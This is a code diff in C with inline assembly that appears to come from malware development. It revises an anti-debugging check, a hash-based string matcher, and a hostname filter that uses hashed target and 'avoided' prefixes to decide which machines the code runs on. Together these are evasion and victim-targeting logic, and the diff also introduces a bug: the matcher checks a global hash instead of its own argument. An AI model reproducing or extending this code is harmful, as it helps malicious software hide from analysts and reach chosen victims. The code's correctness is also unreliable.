@@ -1,9 +1,8 @@
 #include "definitions.h"
 
 
-uint8_t is_being_debugged() {
-    PVOID pebAddress;
-    uint8_t beingDebugged = 0;
+bool is_being_debugged() {
+    bool beingDebugged = false;
     #ifdef _WIN64
         __asm__ (
             "mov $0xae, %%rax\n\t"
@@ -69,11 +68,13 @@ unsigned int RO(const char* str, uint8_t rotation_value, bool is_rotation_right)
     return hash;
 }
 
+bool is_objhash_null(ObjHash obj_hash) {
+    return (obj_hash.value == 0 && obj_hash.rotation_value == 0 && obj_hash.is_rotation_right == false);
+}
+
 bool is_string_matching_prefixHash(const char* str, ObjHash prefix_hash) {
-    if (prefix_hash.rotation_value == 0) {
+    if (is_objhash_null(TARGET_HOSTNAME_PREFIX_HASH)) {
         return false;
-    } else {
-        return true;
     }
 
     bool match = true;
@@ -101,8 +102,8 @@ bool is_string_matching_prefixHash(const char* str, ObjHash prefix_hash) {
         "rol %%cl, %%r9d\n\t"              
     "rotate_end_%=:\n\t"
         "pop %%rcx\n\t"
-        "add %%eax, %%r9d\n\t"            // Add AL to hash
-        "cmp %%r10d, %%r9d\n\t"           // Compare hash
+        "add %%eax, %%r9d\n\t"
+        "cmp %%r10d, %%r9d\n\t"
         "jz matching\n\t"
         "cmp %%ah, %%al\n\t"
         "jnz hash_loop\n\t"
@@ -112,9 +113,9 @@ bool is_string_matching_prefixHash(const char* str, ObjHash prefix_hash) {
     "matching:\n\t"
         "mov $1, %[result]\n\t"
     "end:\n\t"
-        : [result] "=r" (match)                      // Output
+        : [result] "=r" (match)
         : [hash] "r" (prefix_hash.value), [string] "r" (str), [strlen] "r" (str_len), [rotation_value] "r" (prefix_hash.rotation_value), [is_ror] "m" (prefix_hash.is_rotation_right)                // Input
-        : "rax", "rcx", "rsi", "r8", "r9", "r10", "memory"  // Clobbers
+        : "rax", "rcx", "rsi", "r8", "r9", "r10", "memory"
     );
     return match;
 }
@@ -122,11 +123,12 @@ bool is_string_matching_prefixHash(const char* str, ObjHash prefix_hash) {
 bool is_valid_hostname(const char* hostname) {
     if (is_string_matching_prefixHash(hostname, TARGET_HOSTNAME_PREFIX_HASH)) {
         return true;
-    }
-    for (size_t i = 0; i < AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE; i++) {
-        if (is_string_matching_prefixHash(hostname, AVOIDED_HOSTNAME_PREFIX_HASHES[i])) {
-            return false;
+    } else {
+        for (size_t i = 0; i < AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE; i++) {
+            if (is_string_matching_prefixHash(hostname, AVOIDED_HOSTNAME_PREFIX_HASHES[i])) {
+                return false;
+            }
         }
     }
-    return false;
+    return true;
 }
